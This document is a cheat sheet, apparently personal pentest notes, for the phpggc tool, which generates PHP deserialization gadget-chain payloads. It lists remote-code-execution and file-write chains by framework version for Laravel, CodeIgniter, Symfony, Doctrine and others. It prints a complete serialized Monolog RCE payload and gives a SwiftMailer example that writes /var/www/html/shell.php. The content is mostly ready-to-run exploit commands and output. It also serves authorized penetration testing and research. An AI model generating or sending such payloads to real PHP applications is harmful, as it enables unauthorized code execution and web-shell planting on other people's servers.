## Basic commands
- Better use in Kali
- [Repo](https://github.com/ambionics/phpggc)

#### List all payloads
```
$ ./phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                                              TYPE                   VECTOR         I    
Bitrix/RCE1                               17.x.x <= 22.0.300                                   RCE (Function call)    __destruct          
CakePHP/RCE1                              ? <= 3.9.6                                           RCE (Command)          __destruct          
CakePHP/RCE2                              ? <= 4.2.3                                           RCE (Function call)    __destruct          
CodeIgniter4/FR1                          4.0.0 <= 4.3.6                                       File read              __toString     *    
CodeIgniter4/RCE1                         4.0.2 <= 4.0.3                                       RCE (Function call)    __destruct          
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                  RCE (Function call)    __destruct          
CodeIgniter4/RCE3                         4.0.4 <= 4.3.6                                       RCE (Function call)    __destruct          
CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                           RCE (Function call)    __destruct          
CodeIgniter4/RCE5                         -4.1.3+                                              RCE (Function call)    __destruct          
CodeIgniter4/RCE6                         -4.1.3 <= 4.2.10+                                    RCE (Function call)    __destruct          
Doctrine/FW1                              ?                                                    File write             __toString     *    
Doctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5                       File write             __destruct     *    
Doctrine/RCE1                             1.5.1 <= 2.7.2                                       RCE (PHP code)         __destruct     *    
Doctrine/RCE2                             1.11.0 <= 2.3.2                                      RCE (Function call)    __destruct     *    
Dompdf/FD1                                1.1.1 <= ?                                           File delete            __destruct     *    
...
```

#### Useful from docs
Filter:
```
$ ./phpggc -l laravel

Gadget Chains
-------------

NAME             VERSION            TYPE                   VECTOR        I    
Laravel/RCE1     5.4.27             RCE (Function call)    __destruct         
Laravel/RCE10    5.6.0 <= 9.1.8+    RCE (Function call)    __toString         
Laravel/RCE2     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE3     5.5.0 <= 5.8.35    RCE (Function call)    __destruct    *    
Laravel/RCE4     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE5     5.8.30             RCE (PHP code)         __destruct    *    
Laravel/RCE6     5.5.* <= 5.8.35    RCE (PHP code)         __destruct    *    
Laravel/RCE7     ? <= 8.16.1        RCE (Function call)    __destruct    *    
Laravel/RCE8     7.0.0 <= 8.6.9+    RCE (Function call)    __destruct    *    
Laravel/RCE9     5.4.0 <= 9.1.8+    RCE (Function call)    __destruct  
```
Use **-i** to get details:

```
$ ./phpggc -i symfony/rce1
Name           : Symfony/RCE1
Version        : 3.3
Type           : rce
Vector         : __destruct
Informations   : 
Exec through proc_open()

./phpggc Symfony/RCE1 <command>
```
For RCE gadgets, the executed command can have 3 formatting types depending on how the gadget works:
- RCE (Command): **./phpggc Symfony/RCE1 id**
- RCE (PHP code): **./phpggc Symfony/RCE2 'phpinfo();'**
- RCE (Function call): **./phpggc Symfony/RCE4 system id**
Once you have selected a chain, run **./phpggc <gadget-chain> [parameters]** to obtain the payload. For instance, to obtain a payload for Monolog, you'd do:
```
$ ./phpggc monolog/rce1 assert 'phpinfo()'
O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:10:"phpinfo();";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}
```
For a file write using SwiftMailer, you'd do:
```
$ echo 'It works !' > /tmp/data
$ ./phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
O:13:"Swift_Message":8:{...}
```
For more check repo.

## Docker
```
git clone https://github.com/ambionics/phpggc
docker build . -t 'phpggc'
docker run phpggc -l

docker run phpggc Monolog/rce1 'system' 'id'
```